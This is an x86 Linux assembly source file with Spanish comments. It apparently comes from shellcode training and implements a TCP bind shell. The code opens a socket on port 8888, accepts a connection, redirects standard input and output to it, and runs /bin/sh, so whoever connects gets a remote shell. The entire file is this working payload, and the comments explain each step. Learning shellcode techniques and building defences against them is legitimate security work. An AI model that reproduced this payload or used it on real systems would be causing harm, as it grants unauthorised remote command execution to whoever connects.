;nasm -f elf32 -o shell.obj shell.asm && ld -N -m elf_i386 -o shell shell.obj
; https://www.abatchy.com/2017/05/tcp-bind-shell-in-assembly-null
global _start

section .text
_start:

	; Limpiamos los registros a utilizar
	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx

	; Creacion del socket
	mov al, 0x66 		; socketcall (102) #define __NR_socketcall 102
	mov bl, 0x1		    ; SYS_SOCKET (1)   #define SYS_SOCKET	1
	push ecx		    ; protocolo (0)      colocamos nuestro primer argumento en el stack
	push ebx		    ; SOCK_STREAM (1)  Unicamente colocamos ebx al stack
	push 0x2		    ; AF_INET (2)      Colocamos nuestro segundo argumento en el stack
	mov ecx, esp		; Colocamos ECX en el tope del stack
	int 0x80		    ; Executamos el socket

	mov edi, eax		; Movemos el socket a EDI

	; Bind el socket
	mov al, 0x66		; socketcall (102)  #define __NR_socketcall 102
	pop ebx			    ; SYS_BIND (2)
	xor edx, edx		; Colocamos ceros en el registro EDX
	push edx		    ; INADDRY_ANY (0)   Despues hay que colocarlo en el stack primer argumento
	push word 0xB822	; sin_port = 8888   Definimos el numero del puerto y lo colocamos en el stack
	push bx			    ; AF_INET (2)       AF_INET ya esta configuradao anteriormente con un 2
	mov ecx, esp		; Una vez configurados nuestros argumentos apuntamos ECX en el tope del stack
	push 0x10		    ; sizeof(host_addr) Tamaño de nuestra estructura que es de 16
	push ecx		    ; Colocamos el puntero de la structura host_addr
	push edi		    ; socketfd
	mov ecx, esp		; Colocamos ECX con todos los argumentos en el tope del stack 
	int 0x80		    ; Executamos
	
	xor eax, eax		; Colocamos cero en EAX

	; Configuramos nuestro socket en escucha 
    ;Necesitamos 2 argumentos nuestro socket y el backlog
	push eax		    ; backlog (0)
	push edi		    ; socketfd
	mov ecx, esp		; Una vez configurados nuestros argumentos apuntamos ECX en el tope del stack
	inc ebx			    ; incremetamos a 3
	inc ebx			    ; incremetamos a 4
	mov al, 0x66		; socketcall (102)  #define __NR_socketcall 102 
	int 0x80		    ; Executamos


	; Aceptar conexiones accept(host_sock, NULL, NULL)
	xor edx, edx		; Colocamos cero en EDX
	push edx		    ; NULL          
	push edx		    ; NULL          
	push edi		    ; socketfd          Nuestro socket
	inc ebx			    ; SYS_ACCEPT (5)    SYS_ACCEPT esta efinido en 5, asi que actualmente contiene un 4 y solo incrementamos
	mov ecx, esp		; Una vez configurados nuestros argumentos apuntamos ECX en el tope del stack
	mov al, 0x66		; socketcall (102)  #define __NR_socketcall 102
	int 0x80		    ; Executamos
	
	xchg ebx, eax		; Movemos el client_sock creado en EBX
	
	; REdireccionamos STDIN, STDERR, STDOUT    dup2(client_sock, 0);
	xor ecx, ecx		; Colocamos cero en ECX
	mov cl, 0x2 		; Configuramos nuestro contador
	
loop:
	mov al, 0x3f		; dup2 (63)             unistd_32.h
	int 0x80		    ; execucion de dup2
	dec ecx			    ; decrementamos nuestro contador
	jns loop		    ; Salto hasta que la badera SF sea configurada

	; Executamos /bin/sh   execve("/bin/sh", NULL, NULL);
	push edx		    ; NULL
	push 0x68732f2f		; "hs//"    //sh    en codigo ASCII
	push 0x6e69622f 	; "nib/"    /bin    en codigo ASCII
	mov ebx, esp		; Una vez configurados nuestros argumentos apuntamos ECX en el tope del stack
	mov ecx, edx		; NULL
	mov al, 0xb		    ; Llamada a execve
	int 0x80		    ; Execucion